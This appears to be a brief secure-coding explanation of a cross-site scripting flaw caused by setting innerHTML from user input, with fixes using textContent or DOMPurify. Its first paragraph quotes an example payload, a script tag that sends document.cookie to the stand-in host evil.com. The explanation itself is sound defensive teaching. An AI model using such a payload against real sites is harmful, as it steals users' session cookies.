This code is vulnerable to Cross-Site Scripting (XSS). The userInput is inserted directly as HTML, allowing an attacker to inject malicious scripts like <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>.

Secure version:
document.getElementById('output').textContent = userInput;

Using textContent instead of innerHTML treats the input as plain text, not HTML, preventing script execution. Alternatively, sanitise the input using a library like DOMPurify: document.getElementById('output').innerHTML = DOMPurify.sanitize(userInput);

